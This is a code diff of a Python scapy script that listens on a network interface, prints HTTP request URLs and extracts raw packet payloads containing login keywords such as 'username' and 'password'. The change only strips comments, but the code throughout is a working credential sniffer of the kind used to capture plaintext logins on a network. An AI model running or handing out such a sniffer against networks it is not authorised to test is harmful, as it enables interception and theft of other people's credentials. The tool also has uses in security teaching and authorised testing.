@@ -13,14 +13,14 @@ def get_arguments():
         parser.error(Fore.RED+"[-]"+Fore.RESET+" Please specify an interface to listen on.")
     return options
 
-def sniffer(interface): #Listens on specified port
+def sniffer(interface):
     print(Fore.YELLOW+"[+]"+Fore.RESET+f" Listening on interface {interface}\n")
     scapy.sniff(iface=interface, store=False, prn=process_packet)
 
-def get_url(packet): # Grabs URL
+def get_url(packet):
     return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
-def get_credentials(packet): # Gets credentials from packet
+def get_credentials(packet):
     if packet.haslayer(scapy.Raw):
             load = str(packet[scapy.Raw].load)
             keywords = ["username", "user", "uname", "login", "password", "pass"]
@@ -28,7 +28,7 @@ def get_credentials(packet): # Gets credentials from packet
                 if keyword in load:
                     return load
 
-def process_packet(packet): # Filters packet for http & outputs data to the terminal
+def process_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print(Fore.YELLOW+"[+]"+Fore.RESET+f" HTTP Request >> {url}")
